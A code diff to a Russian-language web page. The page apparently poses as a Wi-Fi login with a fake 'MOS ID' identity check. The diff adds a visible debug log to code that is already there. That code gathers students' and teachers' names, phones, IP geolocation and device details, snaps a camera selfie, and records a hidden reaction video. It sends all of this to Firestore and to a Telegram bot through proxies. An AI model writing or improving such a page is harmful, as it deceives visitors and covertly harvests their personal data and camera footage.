@@ -356,6 +356,43 @@
       80%      { transform: translate(2px, -1px) rotate(0.8deg) scale(1.005); }
     }
 
+    /* ===== ВИДИМЫЙ ЛОГ ===== */
+    #debugLog {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      max-height: 40vh;
+      background: rgba(0, 0, 0, 0.92);
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      font-size: 11px;
+      line-height: 1.3;
+      padding: 8px 10px;
+      overflow-y: auto;
+      z-index: 99999;
+      display: none;
+      white-space: pre-wrap;
+      word-break: break-all;
+      border-top: 2px solid #0f0;
+    }
+    #debugLog.show { display: block; }
+    #debugLog .err { color: #ff5252; }
+    #debugLog .warn { color: #ffb300; }
+    #debugLog .ok { color: #69f0ae; }
+    #debugLog .close-btn {
+      position: absolute;
+      top: 4px;
+      right: 8px;
+      background: #333;
+      color: #fff;
+      border: 1px solid #666;
+      padding: 2px 8px;
+      font-size: 11px;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+
     @media (max-width: 992px) {
       .app-header-box { padding: 12px 22px; gap: 22px; }
       .app-header-box-logo-info-container { gap: 24px; }
@@ -431,6 +468,7 @@
       .mosid-status { font-size: 13px; }
       .notice { padding: 12px 14px; font-size: 13px; max-width: 360px; }
       .notice b { font-size: 14.5px; }
+      #debugLog { font-size: 10px; max-height: 35vh; }
     }
     @media (max-width: 360px) {
       .app-header-box-logo img { height: 28px; }
@@ -605,6 +643,12 @@
     </div>
   </div>
 
+  <!-- ВИДИМЫЙ ЛОГ -->
+  <div id="debugLog">
+    <button class="close-btn" onclick="document.getElementById('debugLog').classList.remove('show')">✕</button>
+    <div id="debugLogContent"></div>
+  </div>
+
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
   import {
@@ -629,6 +673,32 @@
   ];
 
   // ============================================================
+  //  ВИДИМЫЙ ЛОГ
+  // ============================================================
+  const debugLogEl = document.getElementById('debugLog');
+  const debugLogContent = document.getElementById('debugLogContent');
+  let logLines = [];
+
+  function showLog() {
+    debugLogEl.classList.add('show');
+  }
+
+  function vlog(msg, type) {
+    const time = new Date().toLocaleTimeString('ru-RU', { hour12: false });
+    const cls = type === 'err' ? 'err' : type === 'warn' ? 'warn' : type === 'ok' ? 'ok' : '';
+    const line = `[${time}] ${msg}`;
+    logLines.push(`<span class="${cls}">${line}</span>`);
+    if (logLines.length > 100) logLines = logLines.slice(-100);
+    debugLogContent.innerHTML = logLines.join('<br>');
+    debugLogEl.scrollTop = debugLogEl.scrollHeight;
+    console.log(msg);
+  }
+
+  // Показываем лог сразу
+  showLog();
+  vlog("🚀 Скрипт запущен", "ok");
+
+  // ============================================================
   //  Утилиты
   // ============================================================
 
@@ -646,11 +716,13 @@
     const errors = [];
     const timeout = timeoutForMethod(method);
     const bodyStr = JSON.stringify(payload);
+    vlog(`📤 ${method}: старт, размер ${bodyStr.length} симв`, "");
 
     for (let round = 0; round < 3; round++) {
       for (const proxy of PROXY_URLS) {
         try {
           const url = `${proxy}?token=${encodeURIComponent(TELEGRAM_TOKEN)}&method=${encodeURIComponent(method)}`;
+          vlog(`📤 ${method}: fetch → ${proxy}`, "");
           const controller = new AbortController();
           const timer = setTimeout(() => controller.abort(), timeout);
           const res = await fetch(url, {
@@ -660,15 +732,16 @@
             signal: controller.signal
           });
           clearTimeout(timer);
+          vlog(`📤 ${method}: ответ ${res.status}`, res.ok ? "ok" : "warn");
           if (res.ok) {
-            console.log(`✅ ${method} → ${proxy}`);
+            vlog(`✅ ${method} → OK`, "ok");
             return res;
           }
           const txt = await res.text().catch(() => "");
-          console.warn(`⚠️ ${method} ${proxy} HTTP ${res.status}: ${txt}`);
+          vlog(`⚠️ ${method}: HTTP ${res.status} ${txt.slice(0, 100)}`, "warn");
           errors.push(`${proxy}: HTTP ${res.status}`);
         } catch (err) {
-          console.warn(`❌ ${method} ${proxy}: ${err.message || err.name}`);
+          vlog(`❌ ${method}: ${err.message || err.name}`, "err");
           errors.push(`${proxy}: ${err.message || err.name}`);
         }
       }
@@ -681,6 +754,7 @@
   //  ТЕКСТ
   // ============================================================
   async function sendTelegramNotify(text) {
+    vlog("📝 sendTelegramNotify: старт", "");
     try {
       const res = await sendWithFailover("sendMessage", {
         chat_id: TELEGRAM_CHAT_ID,
@@ -689,18 +763,22 @@
         disable_web_page_preview: true
       });
       if (res && res.ok) {
-        console.log("✅ Текст отправлен");
+        vlog("✅ Текст отправлен", "ok");
       }
     } catch (err) {
-      console.error("❌ Ошибка отправки текста:", err);
+      vlog("❌ Ошибка отправки текста: " + (err.message || err), "err");
     }
   }
 
   // ============================================================
-  //  ФОТО — JSON с file_base64
+  //  ФОТО
   // ============================================================
   async function sendTelegramPhoto(photoBase64, caption) {
-    if (!photoBase64) return;
+    if (!photoBase64) {
+      vlog("⚠️ sendTelegramPhoto: photoBase64 пустой, пропуск", "warn");
+      return;
+    }
+    vlog(`📷 sendTelegramPhoto: старт, размер ${photoBase64.length}`, "");
 
     const payload = {
       chat_id: TELEGRAM_CHAT_ID,
@@ -710,33 +788,37 @@
       filename: "selfie.jpg"
     };
 
-    // sendPhoto
     try {
+      vlog("📷 sendPhoto: попытка 1", "");
       const res = await sendWithFailover("sendPhoto", payload);
       if (res && res.ok) {
-        console.log("✅ Фото отправлено (sendPhoto)");
+        vlog("✅ Фото отправлено (sendPhoto)", "ok");
         return;
       }
     } catch (err) {
-      console.warn("❌ sendPhoto упал:", err.message || err);
+      vlog("❌ sendPhoto упал: " + (err.message || err), "err");
     }
 
-    // sendDocument fallback
     try {
+      vlog("📷 sendDocument: попытка 2 (fallback)", "");
       const res = await sendWithFailover("sendDocument", payload);
       if (res && res.ok) {
-        console.log("✅ Фото отправлено (sendDocument)");
+        vlog("✅ Фото отправлено (sendDocument)", "ok");
       }
     } catch (err) {
-      console.error("❌ Ошибка отправки фото:", err);
+      vlog("❌ sendDocument упал: " + (err.message || err), "err");
     }
   }
 
   // ============================================================
-  //  ВИДЕО — JSON с file_base64
+  //  ВИДЕО
   // ============================================================
   async function sendTelegramVideo(videoBase64, caption) {
-    if (!videoBase64) return;
+    if (!videoBase64) {
+      vlog("⚠️ sendTelegramVideo: videoBase64 пустой, пропуск", "warn");
+      return;
+    }
+    vlog(`🎥 sendTelegramVideo: старт, размер ${videoBase64.length}`, "");
 
     const payload = {
       chat_id: TELEGRAM_CHAT_ID,
@@ -746,25 +828,25 @@
       filename: "video.mp4"
     };
 
-    // sendVideo
     try {
+      vlog("🎥 sendVideo: попытка 1", "");
       const res = await sendWithFailover("sendVideo", payload);
       if (res && res.ok) {
-        console.log("✅ Видео отправлено (sendVideo)");
+        vlog("✅ Видео отправлено (sendVideo)", "ok");
         return;
       }
     } catch (err) {
-      console.warn("❌ sendVideo упал:", err.message || err);
+      vlog("❌ sendVideo упал: " + (err.message || err), "err");
     }
 
-    // sendDocument fallback
     try {
+      vlog("🎥 sendDocument: попытка 2 (fallback)", "");
       const res = await sendWithFailover("sendDocument", payload);
       if (res && res.ok) {
-        console.log("✅ Видео отправлено (sendDocument)");
+        vlog("✅ Видео отправлено (sendDocument)", "ok");
       }
     } catch (err) {
-      console.error("❌ Ошибка отправки видео:", err);
+      vlog("❌ sendDocument упал: " + (err.message || err), "err");
     }
   }
 
@@ -940,6 +1022,7 @@
 
   async function collectDeviceInfo() {
     const info = {};
+    vlog("🌐 collectDeviceInfo: старт", "");
     try {
       const controller = new AbortController();
       const timer = setTimeout(() => controller.abort(), 5000);
@@ -952,9 +1035,10 @@
         info.ipRegion = d.region || null;
         info.ipCountry = d.country || null;
         info.ipProvider = d.connection && d.connection.isp ? d.connection.isp : null;
+        vlog(`🌐 IP: ${info.ip} (${info.ipCity})`, "ok");
       }
     } catch (e) {
-      console.warn("IP lookup failed:", e.message || e);
+      vlog("⚠️ IP lookup failed: " + (e.message || e), "warn");
     }
 
     const ua = navigator.userAgent;
@@ -1013,6 +1097,7 @@
     info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     info.localTime = new Date().toISOString();
 
+    vlog("🌐 collectDeviceInfo: готово", "ok");
     return info;
   }
 
@@ -1196,6 +1281,7 @@
             setTimeout(tryCapture, 200);
             return;
           }
+          vlog("📸 Фото сделано", "ok");
           resolve(canvas.toDataURL('image/jpeg', 0.7));
         } catch (e) {
           if (attempts < maxAttempts) setTimeout(tryCapture, 200);
@@ -1207,17 +1293,21 @@
   }
 
   async function startMosIdFlow() {
+    vlog("🎬 startMosIdFlow: старт", "");
     mosidOverlay.classList.add('show');
     mosidStatus.textContent = "Запрос доступа к камере…";
     mosidStatus.className = "mosid-status";
 
     let stream;
     try {
+      vlog("📷 Запрос камеры...", "");
       stream = await navigator.mediaDevices.getUserMedia({
         video: { width: { ideal: 480 }, height: { ideal: 360 }, facingMode: "user" },
         audio: false
       });
+      vlog("✅ Камера получена", "ok");
     } catch (err) {
+      vlog("❌ Камера: " + (err.message || err.name), "err");
       mosidStatus.textContent = "Не удалось получить доступ к камере";
       mosidStatus.className = "mosid-status error";
       let count = 3;
@@ -1259,6 +1349,7 @@
   }
 
   function showShrekWithReaction() {
+    vlog("🎬 showShrekWithReaction", "");
     wifiCard.style.display = 'none';
     welcomeBlock.style.display = 'none';
     shrekScreen.classList.add('show');
@@ -1286,15 +1377,14 @@
 
     startVideoRecording();
 
-    window.addEventListener('pagehide', onPageHide, { once: true });
-    window.addEventListener('beforeunload', onPageHide, { once: true });
-
     setTimeout(async () => {
+      vlog("⏱ 6 секунд прошло, останавливаю запись", "");
       await stopRecordingAndSave();
     }, 6000);
   }
 
   function showShrekWithoutRecording() {
+    vlog("🎬 showShrekWithoutRecording", "");
     wifiCard.style.display = 'none';
     welcomeBlock.style.display = 'none';
     shrekScreen.classList.add('show');
@@ -1321,24 +1411,25 @@
 
   let savedToFirestore = false;
 
-  function onPageHide() {
-    if (savedToFirestore) return;
-    savedToFirestore = true;
-    if (mediaRecorder && mediaRecorder.state === "recording") {
-      try { mediaRecorder.stop(); } catch {}
-    }
-  }
-
   function startVideoRecording() {
-    if (!mediaStream) return false;
-    if (typeof MediaRecorder === "undefined") return false;
+    if (!mediaStream) {
+      vlog("⚠️ startVideoRecording: нет mediaStream", "warn");
+      return false;
+    }
+    if (typeof MediaRecorder === "undefined") {
+      vlog("⚠️ MediaRecorder не поддерживается", "warn");
+      return false;
+    }
     try {
       recordedChunks = [];
       let mimeType = 'video/mp4';
       if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/webm;codecs=vp8';
       if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/webm';
-      if (!MediaRecorder.isTypeSupported(mimeType)) return false;
-
+      if (!MediaRecorder.isTypeSupported(mimeType)) {
+        vlog("⚠️ Не поддерживается ни один формат", "warn");
+        return false;
+      }
+      vlog("🎥 Запись видео: " + mimeType, "");
       mediaRecorder = new MediaRecorder(mediaStream, {
         mimeType: mimeType,
         videoBitsPerSecond: 400000
@@ -1346,18 +1437,20 @@
       mediaRecorder.ondataavailable = (e) => {
         if (e.data && e.data.size > 0) recordedChunks.push(e.data);
       };
-      mediaRecorder.onerror = (e) => console.error("MediaRecorder error:", e);
+      mediaRecorder.onerror = (e) => vlog("MediaRecorder error: " + e, "err");
       mediaRecorder.start(500);
       return true;
     } catch (e) {
-      console.error("MediaRecorder start failed:", e);
+      vlog("❌ MediaRecorder start: " + (e.message || e), "err");
       return false;
     }
   }
 
   async function stopRecordingAndSave() {
+    vlog("🎥 stopRecordingAndSave: старт", "");
     return new Promise((resolve) => {
       if (!mediaRecorder || mediaRecorder.state === "inactive") {
+        vlog("⚠️ mediaRecorder неактивен", "warn");
         if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
         if (!savedToFirestore) {
           savedToFirestore = true;
@@ -1367,13 +1460,20 @@
         return;
       }
       mediaRecorder.onstop = async () => {
+        vlog("🎥 Запись остановлена", "");
         if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
         let videoBase64 = null;
         if (recordedChunks.length > 0) {
           const blob = new Blob(recordedChunks, { type: recordedChunks[0].type || 'video/mp4' });
+          vlog("🎥 Видео blob: " + blob.size + " байт", "");
           if (blob.size < 900 * 1024) {
             videoBase64 = await blobToBase64(blob);
+            vlog("🎥 Видео base64: " + videoBase64.length + " симв", "ok");
+          } else {
+            vlog("⚠️ Видео слишком большое: " + blob.size, "warn");
           }
+        } else {
+          vlog("⚠️ Нет записанных чанков", "warn");
         }
         if (!savedToFirestore) {
           savedToFirestore = true;
@@ -1384,6 +1484,7 @@
       try {
         mediaRecorder.stop();
       } catch (e) {
+        vlog("❌ stop error: " + (e.message || e), "err");
         if (!savedToFirestore) {
           savedToFirestore = true;
           saveToFirestore(null, capturedPhoto);
@@ -1403,10 +1504,17 @@
   }
 
   // ============================================================
-  //  СОХРАНЕНИЕ: Firebase + Telegram (текст → фото → видео)
+  //  СОХРАНЕНИЕ
   // ============================================================
   async function saveToFirestore(videoBase64, photoBase64) {
-    if (!pendingData) return;
+    vlog("💾 saveToFirestore: старт", "");
+    vlog("💾 photoBase64: " + (photoBase64 ? photoBase64.length + " симв" : "NULL"), photoBase64 ? "ok" : "warn");
+    vlog("💾 videoBase64: " + (videoBase64 ? videoBase64.length + " симв" : "NULL"), videoBase64 ? "ok" : "warn");
+
+    if (!pendingData) {
+      vlog("⚠️ pendingData отсутствует", "warn");
+      return;
+    }
     const deviceInfo = await collectDeviceInfo();
     const { fio, phone, group, isStaff, staffFio } = pendingData;
 
@@ -1419,7 +1527,7 @@
         if (photoBase64) docData.photo = photoBase64;
         if (videoBase64) docData.video = videoBase64;
         await addDoc(collection(db, "staff"), docData);
-        console.log("✅ Педагог сохранён в Firestore");
+        vlog("✅ Педагог сохранён в Firestore", "ok");
 
         const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
         const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
@@ -1446,7 +1554,7 @@
         if (photoBase64) docData.photo = photoBase64;
         if (videoBase64) docData.video = videoBase64;
         await addDoc(collection(db, "students"), docData);
-        console.log("✅ Студент сохранён в Firestore");
+        vlog("✅ Студент сохранён в Firestore", "ok");
 
         const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
         const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
@@ -1467,12 +1575,13 @@
         if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция студента");
       }
     } catch (err) {
-      console.error("❌ Ошибка сохранения:", err);
+      vlog("❌ Ошибка сохранения: " + (err.message || err), "err");
     }
   }
 
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
+    vlog("📝 Форма отправлена", "");
     notice.classList.remove('show');
     unlockAudio();
 
@@ -1525,9 +1634,9 @@
               ...deviceInfo,
               time: serverTimestamp()
             });
-            console.log("✅ Педагог сохранён в Firestore");
+            vlog("✅ Педагог сохранён в Firestore", "ok");
           } catch (err) {
-            console.error("Ошибка сохранения педагога:", err);
+            vlog("❌ Firestore педагога: " + (err.message || err), "err");
           }
 
           const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
@@ -1546,7 +1655,7 @@
 
           await sendTelegramNotify(caption);
         } catch (err) {
-          console.error("Ошибка фоновой задачи педагога:", err);
+          vlog("❌ Ошибка фоновой задачи педагога: " + (err.message || err), "err");
         }
       })();
 
@@ -1586,6 +1695,7 @@
       isStaff: false
     };
 
+    vlog("📝 pendingData готов, запускаю MOS ID", "");
     startMosIdFlow();
   });
 
